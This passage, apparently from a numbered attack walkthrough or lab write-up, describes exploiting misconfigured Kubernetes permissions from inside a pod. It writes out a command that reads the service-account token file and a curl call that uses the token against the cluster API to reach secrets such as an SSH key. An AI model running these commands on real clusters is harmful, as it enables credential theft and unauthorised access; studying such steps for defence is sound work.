...
6- install curl
6- Because of the misconfigured permissions, attacker can access the secrets with `TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)`
7- Get secrets (the SSH Key) with Kubernetes API calls `curl --insecure --header "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods`
